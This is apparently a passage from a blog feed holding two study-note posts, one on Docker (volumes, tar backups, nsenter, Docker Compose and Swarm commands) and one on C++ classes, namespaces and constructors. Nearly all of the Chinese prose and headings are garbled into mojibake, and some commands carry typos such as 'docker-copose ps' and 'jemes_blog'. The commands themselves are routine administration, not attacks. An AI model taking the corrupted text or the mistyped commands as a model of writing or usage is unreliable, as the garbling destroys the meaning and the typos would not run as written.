ä½¿ç”¨ Docker æ„å»ºæœåŠ¡"></a>ç¬¬6ç«  ä½¿ç”¨ Docker æ„å»ºæœåŠ¡</h1><h2 id="6-1-æ„å»ºç¬¬ä¸€ä¸ªåº”ç”¨"><a href="#6-1-æ„å»ºç¬¬ä¸€ä¸ªåº”ç”¨" class="headerlink" title="6.1 æ„å»ºç¬¬ä¸€ä¸ªåº”ç”¨"></a>6.1 æ„å»ºç¬¬ä¸€ä¸ªåº”ç”¨</h2><h3 id="6-1-1-JekyII-åŸºç¡€é•œåƒ"><a href="#6-1-1-JekyII-åŸºç¡€é•œåƒ" class="headerlink" title="6.1.1 JekyII åŸºç¡€é•œåƒ"></a>6.1.1 JekyII åŸºç¡€é•œåƒ</h3><h3 id="6-1-2-æ„å»º-Jekyll-åŸºç¡€é•œåƒ"><a href="#6-1-2-æ„å»º-Jekyll-åŸºç¡€é•œåƒ" class="headerlink" title="6.1.2 æ„å»º Jekyll åŸºç¡€é•œåƒ"></a>6.1.2 æ„å»º Jekyll åŸºç¡€é•œåƒ</h3><h3 id="6-1-5-å¯åŠ¨-Jekyll-ç½‘ç«™"><a href="#6-1-5-å¯åŠ¨-Jekyll-ç½‘ç«™" class="headerlink" title="6.1.5 å¯åŠ¨ Jekyll ç½‘ç«™"></a>6.1.5 å¯åŠ¨ Jekyll ç½‘ç«™</h3><p>å¯åŠ¨ä¸€ä¸ªå«åš <code>james_blog</code> çš„æ–°å®¹å™¨, æŠŠæœ¬åœ°çš„ james_blog ç›®å½•ä½œä¸º <code>/data/</code> å·æŒ‚è½½åˆ°å®¹å™¨é‡Œ:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -v <span class="hljs-regexp">/home/</span>james<span class="hljs-regexp">/james_blog:/</span>data/ \<br>--name james_blog jamtur01/jekyll<br></code></pre></td></tr></table></figure><p>å·åœ¨ Docker å®¿ä¸»æœºçš„ <code>/var/lib/docker/volumes</code> ç›®å½•ä¸­, å¯ä»¥é€šè¿‡ <code>docker inspect</code> å‘½ä»¤æŸ¥çœ‹æŸä¸ªå·çš„å…·ä½“ä½ç½®.</p><p>å¦‚æœæƒ³åœ¨å¦ä¸€ä¸ªå®¹å™¨é‡Œä½¿ç”¨ <code>/var/www/html/</code> å·é‡Œç¼–è¯‘å¥½çš„ç½‘ç«™, å¯ä»¥å»ºç«‹ä¸€ä¸ªæ–°çš„é“¾æ¥åˆ°è¿™ä¸ªå·çš„å®¹å™¨:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ sudo docker <span class="hljs-built_in">run</span> -d -P <span class="hljs-comment">--volumes-from jemes_blog jamtur01/apache 091570cc2267</span><br></code></pre></td></tr></table></figure><p><code>--volumes-from</code> æ ‡å¿—, æŠŠæŒ‡å®šå®¹å™¨é‡Œçš„æ‰€æœ‰å·éƒ½åŠ å…¥æ–°åˆ›å»ºçš„å®¹å™¨é‡Œ.</p><p>å· è¿™ä¸ªæ¦‚å¿µæ„Ÿè§‰å®é™…ä¸Šå°±æ˜¯æŒ‚è½½, ä½ åœ¨ Docker é‡Œé¢ä¿®æ”¹äº†è¿™ä¸ª å· é‡Œçš„å†…å®¹, å®¿ä¸»æœºä¸Šé¢çš„ç›®å½•ä¹Ÿä¼šæ›´æ–°.</p><h3 id="6-1-7-å¤‡ä»½-Jekyll-å·"><a href="#6-1-7-å¤‡ä»½-Jekyll-å·" class="headerlink" title="6.1.7 å¤‡ä»½ Jekyll å·"></a>6.1.7 å¤‡ä»½ Jekyll å·</h3><p>å¦‚:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">$ sudo docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> --volumes-from james_blog \</span><br><span class="language-bash">-v $(<span class="hljs-built_in">pwd</span>):/backup ubuntu \</span><br><span class="language-bash">tar cvf /backup/james_blog_backup.tar /var/www/html</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢å‘½ä»¤çš„è§£é‡Šä¸º, <code>--rm</code> å‚æ•°è¡¨æ˜ä¼šåœ¨å®¹å™¨çš„è¿›ç¨‹è¿è¡Œå®Œæ¯•å, è‡ªåŠ¨åˆ é™¤å®¹å™¨, <code>--volumes-from james_blog</code> æŒ‡å®šä»å“ªä¸ªå®¹å™¨ä¸­è·å– volumes, <code>-v $(pwd):/backup</code> å°†å½“å‰ç›®å½• (å³ç”¨æ¥å­˜å¤‡ä»½æ–‡ä»¶çš„ç›®å½•) æŒ‚è½½åˆ°å®¹å™¨ä¸­çš„ <code>/backup</code> ç›®å½•ä¸‹, <code>ubuntu</code> æ˜¯ image çš„åç§°, <code>tar cvf /backup/james_blog_backup.tar /var/www/html</code> æ˜¯å°† <code>/var/www/html</code> æ‰“åŒ…ä¸º <code>/backup/james_blog_backup.tar</code> æ–‡ä»¶.</p><h3 id="6-1-8-æ‰©å±•-Jekyll-ç¤ºä¾‹ç½‘ç«™"><a href="#6-1-8-æ‰©å±•-Jekyll-ç¤ºä¾‹ç½‘ç«™" class="headerlink" title="6.1.8 æ‰©å±• Jekyll ç¤ºä¾‹ç½‘ç«™"></a>6.1.8 æ‰©å±• Jekyll ç¤ºä¾‹ç½‘ç«™</h3><h2 id="6-2-ä½¿ç”¨-Docker-æ„å»ºä¸€ä¸ª-Java-åº”ç”¨æœåŠ¡"><a href="#6-2-ä½¿ç”¨-Docker-æ„å»ºä¸€ä¸ª-Java-åº”ç”¨æœåŠ¡" class="headerlink" title="6.2 ä½¿ç”¨ Docker æ„å»ºä¸€ä¸ª Java åº”ç”¨æœåŠ¡"></a>6.2 ä½¿ç”¨ Docker æ„å»ºä¸€ä¸ª Java åº”ç”¨æœåŠ¡</h2><h3 id="6-2-1-WAR-æ–‡ä»¶çš„è·å–ç¨‹åº"><a href="#6-2-1-WAR-æ–‡ä»¶çš„è·å–ç¨‹åº" class="headerlink" title="6.2.1 WAR æ–‡ä»¶çš„è·å–ç¨‹åº"></a>6.2.1 WAR æ–‡ä»¶çš„è·å–ç¨‹åº</h3><h2 id="6-3-å¤šå®¹å™¨çš„åº”ç”¨æ ˆ"><a href="#6-3-å¤šå®¹å™¨çš„åº”ç”¨æ ˆ" class="headerlink" title="6.3 å¤šå®¹å™¨çš„åº”ç”¨æ ˆ"></a>6.3 å¤šå®¹å™¨çš„åº”ç”¨æ ˆ</h2><p><code>docker run</code> ä¸­çš„ <code>-h</code> æ ‡å¿—, ç”¨äºæŒ‡å®šå®¹å™¨çš„ä¸»æœºå. </p><h2 id="6-4-ä¸ä½¿ç”¨-SSH-ç®¡ç†-Docker-å®¹å™¨"><a href="#6-4-ä¸ä½¿ç”¨-SSH-ç®¡ç†-Docker-å®¹å™¨" class="headerlink" title="6.4 ä¸ä½¿ç”¨ SSH ç®¡ç† Docker å®¹å™¨"></a>6.4 ä¸ä½¿ç”¨ SSH ç®¡ç† Docker å®¹å™¨</h2><p>ä¼ ç»Ÿä¸Šè®², é€šè¿‡ SSH ç™»å…¥è¿è¡Œç¯å¢ƒæˆ–è€…è™šæ‹Ÿæœºæ¥ç®¡ç†æœåŠ¡.</p><p>åœ¨ Docker é‡Œ, å¤§éƒ¨åˆ†å®¹å™¨éƒ½åªè¿è¡Œä¸€ä¸ªè¿›ç¨‹, æ‰€ä»¥ä¸èƒ½ä½¿ç”¨è¿™ç§è®¿é—®æ–¹æ³•.</p><p>éœ€è¦ç™»å…¥å®¹å™¨æ—¶, å¯ä»¥ä½¿ç”¨ <code>nsenter</code> å·¥å…·.</p><p>nsenter å¯ä»¥è¿›å…¥ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å®¹å™¨çš„ shell, å³ä¾¿è¿™ä¸ªå®¹å™¨æ²¡æœ‰è¿è¡Œ SSH æˆ–ä»»ä½•ç±»ä¼¼ç›®çš„çš„å®ˆæŠ¤è¿›ç¨‹. å¯ä»¥é€šè¿‡ Docker å®¹å™¨å®‰è£… nsenter:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -v <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin:/</span>target jpetazzo/nsenter<br></code></pre></td></tr></table></figure><p>å…·ä½“è§ä¹¦.</p><h1 id="ç¬¬7ç« -Docker-ç¼–é…å’ŒæœåŠ¡å‘ç°"><a href="#ç¬¬7ç« -Docker-ç¼–é…å’ŒæœåŠ¡å‘ç°" class="headerlink" title="ç¬¬7ç«  Docker ç¼–é…å’ŒæœåŠ¡å‘ç°"></a>ç¬¬7ç«  Docker ç¼–é…å’ŒæœåŠ¡å‘ç°</h1><p>Docker Compose æ˜¯ Docker çš„ç¼–é…å·¥å…·.</p><h2 id="7-1-Docker-Compose"><a href="#7-1-Docker-Compose" class="headerlink" title="7.1 Docker Compose"></a>7.1 Docker Compose</h2><p>ä½¿ç”¨ Docker Compose, å¯ä»¥ç”¨ä¸€ä¸ª YAML æ–‡ä»¶å®šä¹‰ä¸€ç»„è¦å¯åŠ¨çš„å®¹å™¨, ä»¥åŠå®¹å™¨è¿è¡Œæ—¶çš„å±æ€§. Docker Compose ç§°è¿™äº›å®¹å™¨ä¸º â€œæœåŠ¡â€.</p><h3 id="7-1-1-å®‰è£…-Docker-Compose"><a href="#7-1-1-å®‰è£…-Docker-Compose" class="headerlink" title="7.1.1 å®‰è£… Docker Compose"></a>7.1.1 å®‰è£… Docker Compose</h3><p>ä¸‰ç§æ–¹æ³•:</p><ul><li>ç›´æ¥å®‰è£…</li><li>Docker Toolbox</li><li>Python Pip</li></ul><p>å¦‚:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo pip <span class="hljs-keyword">install</span> -U docker-compose<br></code></pre></td></tr></table></figure><p>å…·ä½“è§ä¹¦.</p><h3 id="7-1-2-è·å–ç¤ºä¾‹åº”ç”¨"><a href="#7-1-2-è·å–ç¤ºä¾‹åº”ç”¨" class="headerlink" title="7.1.2 è·å–ç¤ºä¾‹åº”ç”¨"></a>7.1.2 è·å–ç¤ºä¾‹åº”ç”¨</h3><h3 id="7-1-3-docker-compose-yml-æ–‡ä»¶"><a href="#7-1-3-docker-compose-yml-æ–‡ä»¶" class="headerlink" title="7.1.3 docker-compose.yml æ–‡ä»¶"></a>7.1.3 docker-compose.yml æ–‡ä»¶</h3><p>æ‰§è¡Œ <code>docker-compose up</code> å‘½ä»¤, Compose ä¼šå¯åŠ¨è¿™äº›å®¹å™¨, ä½¿ç”¨æŒ‡å®šçš„å‚æ•°æ¥æ‰§è¡Œ, å¹¶å°†æ‰€æœ‰æ—¥å¿—è¾“å‡ºåˆå¹¶åˆ°ä¸€èµ·. </p><p>ç¤ºä¾‹ <code>docker-compose.yml</code> æ–‡ä»¶:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">jamtur01/composeapp</span><br>    <span class="hljs-attribute">command</span><span class="hljs-punctuation">:</span> <span class="hljs-string">python app.py</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;5000:5000&quot;</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">.:/composeapp</span><br>    <span class="hljs-attribute">links</span><span class="hljs-punctuation">:</span><br>     <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span><br>  <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br></code></pre></td></tr></table></figure><p><code>links</code> æŒ‡å®šäº†è¦è¿æ¥åˆ°æœåŠ¡çš„å…¶ä»–æœåŠ¡.</p><p>å¯ä»¥åœ¨ Docker Compose å®˜ç½‘æŸ¥çœ‹ docker-compose.yml æ‰€æœ‰å¯ç”¨æŒ‡ä»¤åˆ—è¡¨. <a href="https://docs.docker.com/compose/compose-file/">ä½ç½®</a></p><h3 id="7-1-4-è¿è¡Œ-Compose"><a href="#7-1-4-è¿è¡Œ-Compose" class="headerlink" title="7.1.4 è¿è¡Œ Compose"></a>7.1.4 è¿è¡Œ Compose</h3><p>åˆ›å»ºå¹¶å¯åŠ¨æœåŠ¡:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker-compose up<br></code></pre></td></tr></table></figure><p>ä¸ºäº†ä¿è¯æœåŠ¡æ˜¯å”¯ä¸€çš„, Compose å°† docker-compose.yml æ–‡ä»¶ä¸­æŒ‡å®šçš„æœåŠ¡åç§°åŠ ä¸Šç›®å½•åä½œä¸ºå‰ç¼€, å¹¶åˆ†åˆ«ä½¿ç”¨æ•°å­—ä½œä¸ºåç¼€.</p><p>Compose ä¹‹åæ¥ç®¡äº†æ¯ä¸ªæœåŠ¡è¾“å‡ºçš„æ—¥å¿—, è¾“å‡ºçš„æ—¥å¿—æ¯ä¸€è¡Œéƒ½ä½¿ç”¨ç¼©çŸ­çš„æœåŠ¡åç§°æœ€ä¸ºå‰ç¼€, å¹¶äº¤æ›¿è¾“å‡ºåœ¨ä¸€èµ·.</p><p>æœåŠ¡å’Œ Compose äº¤æ›¿è¿è¡Œ, è¿™æ„å‘³ç€, å¦‚æœä½¿ç”¨ <code>Ctrl+C</code> æ¥åœæ­¢ Compose è¿è¡Œ, ä¹Ÿä¼šåœæ­¢è¿è¡Œçš„æœåŠ¡.</p><p>å¯ä»¥åœ¨è¿è¡Œ <code>Compose</code> æ—¶æŒ‡å®š <code>-d</code> æ ‡å¿—, å…¶å°†ä»¥å®ˆæŠ¤è¿›ç¨‹æ¥è¿è¡ŒæœåŠ¡.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker-compose up -d<br></code></pre></td></tr></table></figure><h3 id="7-1-5-ä½¿ç”¨-Compose"><a href="#7-1-5-ä½¿ç”¨-Compose" class="headerlink" title="7.1.5 ä½¿ç”¨ Compose"></a>7.1.5 ä½¿ç”¨ Compose</h3><p>å¯ä»¥ç”¨ <code>docker-compose ps</code> å‘½ä»¤æ¥æŸ¥çœ‹æœåŠ¡çš„è¿è¡ŒçŠ¶æ€:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker-copose ps<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>docker-compose help +å‘½ä»¤</code> æ¥æŸ¥çœ‹ç›¸å…³ç”¨æ³•. </p><p><code>docker-compose stop</code> å¯ä»¥åœæ­¢æ­£åœ¨è¿è¡Œçš„æœåŠ¡.</p><p><code>docker-compose kill</code> å¼ºåˆ¶æ€æ­»æœåŠ¡.</p><p>ä½¿ç”¨ <code>docker-compose start</code> å‘½ä»¤é‡å¯.</p><p><code>docker-compose rm</code> æ¥åˆ é™¤è¿™äº›æœåŠ¡.</p><h2 id="7-3-Docker-Swarm"><a href="#7-3-Docker-Swarm" class="headerlink" title="7.3 Docker Swarm"></a>7.3 Docker Swarm</h2><p>Docker Swarm æ˜¯ä¸€ä¸ªåŸç”Ÿçš„ Docker é›†ç¾¤ç®¡ç†å·¥å…·.</p><p>Swarm å°†ä¸€ç»„ Docker ä¸»æœºä½œä¸ºä¸€ä¸ªè™šæ‹Ÿçš„ Docker ä¸»æœºæ¥ç®¡ç†.</p><h3 id="7-3-1-å®‰è£…-Swarm"><a href="#7-3-1-å®‰è£…-Swarm" class="headerlink" title="7.3.1 å®‰è£… Swarm"></a>7.3.1 å®‰è£… Swarm</h3><p>æ‹‰å– Docker å…¬å¸æä¾›çš„ <code>swarm</code> é•œåƒå³å¯:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker pull swarm<br></code></pre></td></tr></table></figure><p>è¿è¡Œ Swarm çš„æ‰€æœ‰ Docker èŠ‚ç‚¹éƒ½å¿…é¡»è¿è¡Œç»Ÿä¸€ä¸ªç‰ˆæœ¬çš„ Docker.</p><h3 id="7-3-2-åˆ›å»º-Swarm-é›†ç¾¤"><a href="#7-3-2-åˆ›å»º-Swarm-é›†ç¾¤" class="headerlink" title="7.3.2 åˆ›å»º Swarm é›†ç¾¤"></a>7.3.2 åˆ›å»º Swarm é›†ç¾¤</h3><p>é›†ç¾¤ä¸­çš„æ¯å°ä¸»æœºä¸Šéƒ½è¿è¡Œç€ä¸€ä¸ª <mark> Swarm èŠ‚ç‚¹ä»£ç†</mark> , æ¯ä¸ªä»£ç†éƒ½å°†æ”¹ä¸»æœºä¸Šçš„ç›¸å…³ Docker å®ˆæŠ¤è¿›ç¨‹æ³¨å†Œåˆ°é›†ç¾¤ä¸­.</p><p>å’ŒèŠ‚ç‚¹ä»£ç†ç›¸å¯¹çš„æ˜¯ Swarm çš„ç®¡ç†è€…, ç”¨äºå¯¹é›†ç¾¤è¿›è¡Œç®¡ç†.</p><p>é€šè¿‡é›†ç¾¤å‘ç°åç«¯ (discovery backend, å¦‚ Docker Hub) æ¥å®ç°é›†ç¾¤æ³¨å†Œ. é»˜è®¤ä¸º Docker Hub.</p><p>åœ¨ Docker Hub ä¸­æ³¨å†Œä¸€ä¸ªé›†ç¾¤, ç„¶åè¿”å›ä¸€ä¸ªé›†ç¾¤ ID, ä¹‹åä½¿ç”¨è¿™ä¸ªé›†ç¾¤ ID å‘é›†ç¾¤æ·»åŠ é¢å¤–çš„èŠ‚ç‚¹.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run --<span class="hljs-built_in">rm</span> swarm create<br></code></pre></td></tr></table></figure><p>æ­¤å‘½ä»¤ä¼šè¿”å›ä¸€ä¸ª å­—ç¬¦ä¸², å³é›†ç¾¤ ID.</p><p>è¿è¡Œ Swarm ä»£ç†:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">smoker $ docker run -d swarm <span class="hljs-built_in">join</span> --addr=10.0.0.125:2375 \<br> token://b811b0bc438sifjvajhfiakfidjcbaj83hai<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>join</code> å¹¶ç”¨ <code>--addr</code> ä¼ é€’æœ¬æœº IP åœ°å€.</p><p><code>token://b811b0bc438sifjvajhfiakfidjcbaj83hai</code> è¿™ä¸€ä¸²å°±æ˜¯æŒ‡å®š2é›†ç¾¤ ID.</p><p>æŸ¥çœ‹ä»£ç†èŠ‚ç‚¹çš„åˆ—è¡¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run --<span class="hljs-built_in">rm</span> swarm list token://b811b0bc438sifjvajhfiakfidjcbaj83hai<br></code></pre></td></tr></table></figure><p>å¯åœ¨ä»»æ„å®‰è£…äº† Docker çš„ä¸»æœºä¸Šæ‰§è¡Œ.</p><p>åˆ›å»º Swarm é›†ç¾¤ç®¡ç†è€…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -d -p 2380:2375 swarm manage token://b811b0bc438sifjvajhfiakfidjcbaj83hai<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>C++ ç½‘é¡µå­¦ä¹ </title>
    <link href="/2022/08/25/C++%20%E7%BD%91%E9%A1%B5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/25/C++%20%E7%BD%91%E9%A1%B5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><a href="http://c.biancheng.net/view/2189.html">Cè¯­è¨€ä¸­æ–‡ç½‘</a></p><h2 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h2><p>Cä¸­<code>struct</code>å’ŒC++ä¸­<code>class</code>åŒºåˆ«ï¼Œ<code>class</code>æœ‰æˆå‘˜å‡½æ•°ã€‚</p><h3 id="å®ä¾‹åŒ–"><a href="#å®ä¾‹åŒ–" class="headerlink" title="å®ä¾‹åŒ–"></a>å®ä¾‹åŒ–</h3><p>ç”¨ç±»åˆ›å»ºå¯¹è±¡ï¼Œç§°ä½œç±»çš„å®ä¾‹åŒ–ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿç§°ä½œç±»çš„å®ä¾‹(instance)</p><hr><p>ç±»çš„æˆå‘˜æœ‰æ—¶ç§°ç±»çš„<mark>å±æ€§, property</mark>ï¼Œæˆå‘˜å‡½æ•°æœ‰æ—¶ç§°<mark>æ–¹æ³•, method</mark>ã€‚</p><h3 id="é¢å‘å¯¹è±¡ç¼–ç¨‹"><a href="#é¢å‘å¯¹è±¡ç¼–ç¨‹" class="headerlink" title="é¢å‘å¯¹è±¡ç¼–ç¨‹"></a>é¢å‘å¯¹è±¡ç¼–ç¨‹</h3><p>Object Oriented Progremming, OOP.</p><h2 id="1-4"><a href="#1-4" class="headerlink" title="1.4"></a>1.4</h2><p>å®šä¹‰åç§°ç©ºé—´ç”¨<code>namespace</code>å…³é”®å­—ã€‚</p><pre><code class="hljs">namespace Zhou&#123;    Int own = 10000;&#125;</code></pre><h3 id="åŸŸè§£ææ“ä½œç¬¦"><a href="#åŸŸè§£ææ“ä½œç¬¦" class="headerlink" title="åŸŸè§£ææ“ä½œç¬¦"></a>åŸŸè§£ææ“ä½œç¬¦</h3><p><code>::</code>, ç”¨æ¥æŒ‡æ˜è¦ä½¿ç”¨çš„åç§°ç©ºé—´ã€‚</p><pre><code class="hljs">using Zhou::own;    #å£°æ˜åç§°ç©ºé—´ä¸­çš„ä¸€ä¸ªå˜é‡using namespace Zhou;   #å£°æ˜æ•´ä¸ªåç§°ç©ºé—´</code></pre><p>ä¸­å¤§å‹ç¨‹åºå¼€å‘ä¸æ¨èæŠŠåç§°ç©ºé—´å£°æ˜åœ¨å¤–éƒ¨ï¼Œè¿™æ ·ä¼šå¢åŠ å‘½åå†²çªçš„é£é™©ã€‚</p><h2 id="1-8"><a href="#1-8" class="headerlink" title="1.8"></a>1.8</h2><h3 id="C-å¸ƒå°”ç±»å‹"><a href="#C-å¸ƒå°”ç±»å‹" class="headerlink" title="C++å¸ƒå°”ç±»å‹"></a>C++å¸ƒå°”ç±»å‹</h3><p><code>bool</code>ç±»å‹ï¼Œä¸€èˆ¬é•¿åº¦å 1ä¸ªå­—èŠ‚ï¼Œæœ‰ä¸¤ä¸ªå€¼<code>true</code>å’Œ<code>false</code>, trueä»£è¡¨çœŸï¼Œfalseä»£è¡¨å‡ã€‚</p><p>å¯ä»¥ä½¿ç”¨trueå’Œfalseæ˜¾å¼èµ‹å€¼ï¼š</p><pre><code class="hljs">bool flag = true;</code></pre><h2 id="2-3"><a href="#2-3" class="headerlink" title="2.3"></a>2.3</h2><h3 id="æˆå‘˜è®¿é—®é™å®šç¬¦"><a href="#æˆå‘˜è®¿é—®é™å®šç¬¦" class="headerlink" title="æˆå‘˜è®¿é—®é™å®šç¬¦"></a>æˆå‘˜è®¿é—®é™å®šç¬¦</h3><p><code>public``protected``private</code>, åˆ†åˆ«è¡¨ç¤ºå…¬æœ‰çš„ï¼Œå—ä¿æŠ¤çš„ï¼Œç§æœ‰çš„ï¼Œè¢«ç§°ä¸ºæˆå‘˜è®¿é—®é™å®šç¬¦ã€‚</p><p><mark>è®¿é—®æƒé™</mark>ï¼Œå°±æ˜¯æŒ‡ä½ èƒ½ä¸èƒ½ä½¿ç”¨è¯¥ç±»ä¸­çš„æˆå‘˜ã€‚</p><p>æˆå‘˜å‡½æ•°çš„å®šä¹‰å’Œå£°æ˜ä¸€èˆ¬ä¹Ÿä¼šåˆ†å¼€ã€‚</p><p>å¯¹<code>public</code>å’Œ<code>private</code>çš„ç†è§£ã€‚</p><p><code>public</code>æŒ‡å¯ä»¥é€šè¿‡å¯¹è±¡è¿›è¡Œè®¿é—®å’Œä¿®æ”¹ï¼Œä½ å¯ä»¥åœ¨ç±»å¤–ä½¿ç”¨<code>public</code>å®šä¹‰çš„æˆå‘˜ã€‚</p><p><code>private</code>æŒ‡ä¸èƒ½å¤Ÿä½¿ç”¨å¯¹è±¡è®¿é—®å’Œä¿®æ”¹ï¼Œä½ ä¸èƒ½åœ¨ç±»å¤–ä½¿ç”¨ï¼Œåªæœ‰åœ¨ç±»é‚£ä¸ªå¤§æ‹¬å·å†…ï¼Œæ‰èƒ½ä½¿ç”¨<code>private</code>æˆå‘˜ã€‚</p><p>å¯ä»¥ä½¿ç”¨<code>public</code>çš„æˆå‘˜å‡½æ•°ä¿®æ”¹<code>private</code>çš„æˆå‘˜ã€‚</p><p>æˆå‘˜å˜é‡å¤§éƒ½ä»¥<code>m_</code>å¼€å¤´ï¼Œè¿™æ˜¯çº¦å®šä¿—æˆçš„å†™æ³•ã€‚ä»¥<code>m_</code>å¼€å¤´å¯ä»¥ä¸€çœ¼çœ‹å‡ºè¿™æ˜¯æˆå‘˜å˜é‡ï¼Œåˆå¯ä»¥å’Œæˆå‘˜å‡½æ•°ä¸­çš„å½¢å‚åå­—åŒºåˆ«å¼€ã€‚</p><p>å£°æ˜ä¸º<code>protected</code>ï¼Œåˆ™åªèƒ½åœ¨æ´¾ç”Ÿç±»å†…éƒ¨å¯ä»¥ä½¿ç”¨ã€‚</p><p>ç»™æˆå‘˜å˜é‡èµ‹å€¼çš„å‡½æ•°é€šå¸¸ç§°ä¸ºsetå‡½æ•°ï¼Œä»–ä»¬çš„åå­—é€šå¸¸ä»¥<code>set</code>å¼€å¤´ã€‚</p><p>è¯»å–æˆå‘˜å˜é‡çš„å€¼çš„å‡½æ•°é€šå¸¸ç§°getå‡½æ•°ï¼Œä»–ä»¬çš„åå­—é€šå¸¸ä»¥<code>get</code>å¼€å¤´, ç„¶åæ ¹è·Ÿæˆå‘˜å˜é‡çš„åå­—ã€‚</p><p><mark>ç±»çš„å°è£…æ€§</mark><br>è¿™ç§å°†æˆå‘˜å˜é‡å£°æ˜ä¸º<code>private</code>ï¼Œå°†éƒ¨åˆ†æˆå‘˜å‡½æ•°å£°æ˜ä¸º<code>public</code>çš„åšæ³•ã€‚</p><p>å£°æ˜ä¸ºpublicå’Œprivateçš„é¡ºåºä»»æ„ï¼Œè‹¥æ²¡æœ‰publicå’Œprivateå…³é”®è¯ï¼Œåˆ™é»˜è®¤ä¸ºprivate</p><h2 id="2-6"><a href="#2-6" class="headerlink" title="2.6"></a>2.6</h2><h3 id="æ„é€ å‡½æ•°"><a href="#æ„é€ å‡½æ•°" class="headerlink" title="æ„é€ å‡½æ•°"></a>æ„é€ å‡½æ•°</h3><p>åç§°å’Œç±»ç›¸åŒï¼Œæ²¡æœ‰è¿”å›å€¼ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚</p><p>æƒ³è¦è°ƒç”¨æ„é€ å‡½æ•°ï¼Œå°±å¾—åœ¨åˆ›å»ºå¯¹è±¡æ—¶ä¼ é€’å®å‚ã€‚</p><p>æ„é€ å‡½æ•°å¿…é¡»æ˜¯publicå±æ€§ï¼Œä¸ç„¶æ— æ³•è°ƒç”¨ã€‚</p><p>æ„é€ å‡½æ•°ä¸å…è®¸å‡ºç°è¿”å›å€¼å’Œreturnã€‚</p><p><mark>æ„é€ å‡½æ•°çš„é‡è½½</mark><br>ä¸€ä¸ªç±»å¯ä»¥æœ‰å¤šä¸ªé‡è½½çš„æ„é€ å‡½æ•°ã€‚</p><p>æ„é€ å‡½æ•°çš„è°ƒç”¨æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œä¸€æ—¦åœ¨ç±»ä¸­å®šä¹‰äº†æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆåˆ›å»ºå¯¹è±¡æ˜¯å°±ä¸€å®šè¦è°ƒç”¨.</p><p><mark>é»˜è®¤æ„é€ å‡½æ•°</mark><br>ç”¨æˆ·æ²¡æœ‰è‡ªå·±å®šä¹‰æ„é€ å‡½æ•°æ—¶ï¼Œç”±ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆã€‚</p><p>è°ƒç”¨æ²¡æœ‰å‚æ•°çš„æ„é€ å‡½æ•°æ—¶å¯ä»¥çœç•¥æ‹¬å·ã€‚</p><p><mark>åˆå§‹åŒ–åˆ—è¡¨</mark><br>æ ¼å¼ï¼š</p><pre><code class="hljs">Stedunt::Student(char *name, int age, float score): m_name(name), m_age(age), 